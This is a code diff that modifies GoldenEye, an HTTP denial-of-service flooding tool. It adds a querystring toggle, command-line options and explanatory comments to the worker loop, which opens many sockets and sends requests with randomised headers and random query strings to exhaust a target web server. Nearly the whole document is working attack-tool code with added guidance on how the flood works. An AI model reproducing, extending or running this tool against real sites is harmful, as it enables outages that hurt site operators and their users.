@@ -63,6 +63,8 @@ JOIN_TIMEOUT = 1.0
 DEFAULT_WORKERS = 10
 DEFAULT_SOCKETS = 500
 
+DEFAULT_QUERYSTRING = True
+
 GOLDENEYE_BANNER = 'GoldenEye v2.1 by Jan Seidl <jseidl@wroot.org>'
 
 USER_AGENT_PARTS = {
@@ -119,6 +121,8 @@ class GoldenEye(object):
     # Properties
     url = None
 
+    use_querystring = DEFAULT_QUERYSTRING
+
     # Options
     nr_workers = DEFAULT_WORKERS
     nr_sockets = DEFAULT_SOCKETS
@@ -164,7 +168,7 @@ class GoldenEye(object):
 
             try:
 
-                worker = Striker(self.url, self.nr_sockets, self.counter)
+                worker = Striker(self.url, self.nr_sockets, self.counter, self.use_querystring)
                 worker.useragents = self.useragents
                 worker.method = self.method
 
@@ -240,6 +244,7 @@ class Striker(Process):
     socks = []
     counter = None
     nr_socks = DEFAULT_SOCKETS
+    use_querystring = False
 
     # Flags
     runnable = True
@@ -247,12 +252,13 @@ class Striker(Process):
     # Options
     method = METHOD_GET
 
-    def __init__(self, url, nr_sockets, counter):
+    def __init__(self, url, nr_sockets, counter, use_querystring):
 
         super(Striker, self).__init__()
 
         self.counter = counter
         self.nr_socks = nr_sockets
+        self.use_querystring = use_querystring
 
         parsedUrl = urllib.parse.urlparse(url)
 
@@ -304,11 +310,9 @@ class Striker(Process):
             print("Starting worker {0}".format(self.name))
 
         while self.runnable:
-
             try:
-
+                ## Create connections and add them to list. Distinguishes between http and https connections based on user input.
                 for i in range(self.nr_socks):
-
                     if self.ssl:
                         if SSLVERIFY:
                             c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
@@ -317,24 +321,32 @@ class Striker(Process):
                     else:
                         c = HTTPCLIENT.HTTPConnection(self.host, self.port)
 
+                    ## Socks contains the list of valid connections
                     self.socks.append(c)
 
+                ## Add url, headers and method to connections
                 for conn_req in self.socks:
 
+                    ## Will create the url and headers
                     (url, headers) = self.createPayload()
 
+                    ## Select random method if rand is specified, else use the specified method
                     method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
-
+                    
+                    ## create request with method, url and headers
                     conn_req.request(method.upper(), url, None, headers)
 
+                ## For each connection, if it gets a response it will increment a counter. The counter keeps track of successful
+                ## and failed connections
                 for conn_resp in self.socks:
-
                     resp = conn_resp.getresponse()
+                    ## Add it to active connections
                     self.incCounter()
 
                 self.closeConnections()
 
             except:
+                ## If a connection fails somewhere, add it to failed connections.
                 self.incFailed()
                 if DEBUG:
                     raise
@@ -353,13 +365,13 @@ class Striker(Process):
 
 
     def createPayload(self):
-
+        ## Generates request url and headers...DUH
         req_url, headers = self.generateData()
 
+        ## Selects random headers to send
         random_keys = list(headers.keys())
         random.shuffle(random_keys)
         random_headers = {}
-
         for header_name in random_keys:
             random_headers[header_name] = headers[header_name]
 
@@ -369,8 +381,8 @@ class Striker(Process):
 
         queryString = []
 
+        ## Generates querystrings with random key-value pairs.
         for i in range(ammount):
-
             key = self.buildblock(random.randint(3,10))
             value = self.buildblock(random.randint(3,20))
             element = "{0}={1}".format(key, value)
@@ -380,29 +392,32 @@ class Striker(Process):
 
 
     def generateData(self):
-
         returnCode = 0
         param_joiner = "?"
 
-        if len(self.url) == 0:
-            self.url = '/'
+        ## If no url parameters are specified then just ask for the root.
+        if self.use_querystring:
+            if len(self.url) == 0:
+                self.url = '/'
 
-        if self.url.count("?") > 0:
-            param_joiner = "&"
+            ## If querystring is found then use & to join parameters
+            if self.url.count("?") > 0:
+                param_joiner = "&"
 
-        request_url = self.generateRequestUrl(param_joiner)
+            ## Generates a request url with random query string data.
+            request_url = self.generateRequestUrl(param_joiner)
+        else:
+            request_url = self.url + "/{}.html".format(random.randint(1,10))
 
+        ## Generates random headres
         http_headers = self.generateRandomHeaders()
-
 
         return (request_url, http_headers)
 
     def generateRequestUrl(self, param_joiner = '?'):
-
         return self.url + param_joiner + self.generateQueryString(random.randint(1,5))
 
     def getUserAgent(self):
-
         if self.useragents:
             return random.choice(self.useragents)
 
@@ -452,7 +467,6 @@ class Striker(Process):
         return ua_string
 
     def generateRandomHeaders(self):
-
         # Random no-cache entries
         noCacheDirectives = ['no-cache', 'max-age=0']
         random.shuffle(noCacheDirectives)
@@ -548,6 +562,7 @@ def usage():
     print('\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)')
     print('\t -n, --nosslcheck\tDo not verify SSL Certificate\t\t\t\t(default: True)')
     print('\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)')
+    print('\t -q, --querystring\tUse querystrings in the request\t\t\t\t(default: True)')
     print('\t -h, --help\t\tShows this help')
     print()
     print('-----------------------------------------------------------------------------------------------------------')
@@ -582,11 +597,13 @@ def main():
         if url == None:
             error("No URL supplied")
 
-        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents" ])
+        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:q:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents", "querystring" ])
 
         workers = DEFAULT_WORKERS
         socks = DEFAULT_SOCKETS
         method = METHOD_GET
+        querystring = DEFAULT_QUERYSTRING
+        qs_input = ""
 
         uas_file = None
         useragents = []
@@ -612,22 +629,28 @@ def main():
                     method = a
                 else:
                     error("method {0} is invalid".format(a))
+            elif o in ("-q", "--querystring"):
+                qs_input = a
             else:
                 error("option '"+o+"' doesn't exists")
 
+        if qs_input.title() == "False":
+            querystring = False
 
         if uas_file:
             try:
                 with open(uas_file) as f:
-                    useragents = f.readlines()
+                    useragents = f.read().splitlines()
             except EnvironmentError:
                 error("cannot read file {0}".format(uas_file))
 
+        print(useragents)
         goldeneye = GoldenEye(url)
         goldeneye.useragents = useragents
         goldeneye.nr_workers = workers
         goldeneye.method = method
         goldeneye.nr_sockets = socks
+        goldeneye.use_querystring = querystring
 
         goldeneye.fire()
 
